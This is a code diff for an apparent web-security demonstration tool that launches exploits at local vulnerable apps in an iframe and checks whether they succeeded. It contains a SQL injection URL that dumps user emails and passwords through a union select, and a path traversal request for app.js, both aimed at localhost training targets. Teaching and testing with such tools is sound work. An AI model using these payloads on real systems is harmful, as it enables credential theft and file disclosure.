@@ -62,7 +62,7 @@ document.querySelector('button').click();`,
     secure: `Secure version not yet implemented`,
     successful_substring: "secret",
     attack_request: "window.location.href = 'http://localhost:3001/textreader?fileName=app.js'",
-    custom_behavior: false,
+    custom_behavior: true,
     server_side_exploit: false,
     documentation_html_filepath: "placeholder.html"
   },
@@ -105,7 +105,6 @@ async function sendExploit() {
   try {
     let selectedExploit = exploitSelect.value;
     if (exploitData[selectedExploit].server_side_exploit == true) { // the exploit is to be sent from the server, and the iframe will be overwritten with the response
-
       const response = await fetch('/exploit', {
         method: 'POST',
         headers: {
@@ -138,25 +137,25 @@ async function sendExploit() {
         console.log("Error:", response.status, response.statusText);
       }
     } else { // the exploit is to be sent from the iframe.
-      
       if (exploitData[selectedExploit].custom_behavior == true) {
         if (selectedExploit == "Security Logging and Monitoring Failures") {
           let url = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
           urlbar.value = url
           iframe.src = url
+        } if(selectedExploit == "Path Traversal"){
+        urlbar.value = "http://localhost:3001/textreader?fileName=app.js"
         }
       }
       console.log("Executing in iframe " + exploitData[selectedExploit].attack_request)
       iframe.contentWindow.eval(exploitData[selectedExploit].attack_request);
       result = iframe.contentWindow.document.body.innerText;
 
-      const checkInterval = 50;
+      const checkInterval = 500;
       const timeout = 5000;
       let elapsedTime = 0;
 
       const intervalId = setTimeout(() => {
         const result = iframe.contentWindow.document.body.innerText;
-
         if (result.includes(exploitData[selectedExploit].successful_substring)) {
           clearInterval(intervalId);
           response_output.innerHTML = "The attack was successful!";
@@ -167,7 +166,6 @@ async function sendExploit() {
 
         elapsedTime += checkInterval;
       }, checkInterval);
-
     }
   } catch (error) {
     response_output.innerHTML = "Error: " + error;
